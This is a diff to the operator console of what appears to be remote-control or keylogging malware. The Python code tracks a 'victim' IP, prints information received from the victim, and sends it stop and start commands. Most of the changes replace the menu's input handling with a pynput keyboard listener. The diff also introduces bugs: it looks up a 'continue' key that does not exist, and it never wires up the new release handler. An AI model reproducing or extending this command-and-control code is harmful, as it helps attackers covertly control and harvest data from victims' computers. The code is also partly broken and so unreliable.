@@ -13,7 +13,8 @@ import json
 import threading
 from typing import Optional
 import time
-import keyboard
+# import keyboard
+from pynput.keyboard import Listener, Key
 
 banner = """
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -86,8 +87,8 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
                         self.info_victim = data_str
-                        # print(self.info_victim)
-                        self.buffer += data_str
+                        print(self.info_victim)
+                        # self.buffer += data_str
                         continue
 
                     if signal:
@@ -124,7 +125,7 @@ class ConsoleMenu:
         self.pause_continue = {"Pause": "Pause", "Continue": "Continue"}
         self.options = [
             "Reset", 
-            f"{self.pause_continue["Pause"]}", # Continue
+            f"{self.pause_continue['Pause']}", # Continue
             "Exit"
         ]
         self.controller = None
@@ -156,17 +157,17 @@ class ConsoleMenu:
         print("┗" + "━" * menu_width + "┛")
         print(controller.buffer)
     
-    def handle_input(self):
-        if keyboard.is_pressed('up'):
-            self.current_selection = (self.current_selection - 1) % len(self.options)  
-            return True
-        elif keyboard.is_pressed('down'):
-            self.current_selection = (self.current_selection + 1) % len(self.options)
-            return True
-        elif keyboard.is_pressed('enter'):
-            self.execute_selection()
-            return True
-        return False
+    # def handle_input(self):
+    #     if keyboard.is_pressed('up'):
+    #         self.current_selection = (self.current_selection - 1) % len(self.options)
+    #         return True
+    #     elif keyboard.is_pressed('down'):
+    #         self.current_selection = (self.current_selection + 1) % len(self.options)
+    #         return True
+    #     elif keyboard.is_pressed('enter'):
+    #         self.execute_selection()
+    #         return True
+    #     return False
     
     def execute_selection(self):
         option = self.current_selection
@@ -176,21 +177,48 @@ class ConsoleMenu:
             controller.buffer = ""
         if option == 1: 
             if self.options[1] == "Pause":
-                self.options[1] = f"{self.pause_continue["Continue"]}"
+                self.options[1] = f"{self.pause_continue['continue']}"
                 controller.send_command("stop")
             else:
-                self.options[1] = f"{self.pause_continue["Pause"]}"
+                self.options[1] = f"{self.pause_continue['Pause']}"
                 controller.send_command("start")
         if option == 2: 
             self.running = False
-    
+
+    def on_press(self, key):
+        self.clear_screen()
+        self.draw_menu()
+        try:
+            if key == Key.up:
+                self.current_selection = (self.current_selection - 1) % len(self.options)
+            elif key == Key.down:
+                self.current_selection = (self.current_selection + 1) % len(self.options)
+            elif key == Key.enter:
+                self.execute_selection()
+        except AttributeError:
+            pass
+
+    def on_release(self, key):
+        try:
+            if key == Key.esc or not self.running:
+                self.running = False
+                return False
+        except AttributeError:
+            pass
+
     def run(self):
-        while self.running:
-            self.clear_screen()
-            self.draw_menu() 
-            time.sleep(0.1)
-            self.handle_input()
-        exit()
+        self.clear_screen()
+        self.draw_menu()
+        with Listener(on_press=self.on_press, on_release=None) as listener:
+            listener.join()
+    
+    # def run(self):
+    #     while self.running:
+    #         self.clear_screen()
+    #         self.draw_menu()
+    #         time.sleep(0.1)
+    #         self.handle_input()
+    #     exit()
 
 
 def main():
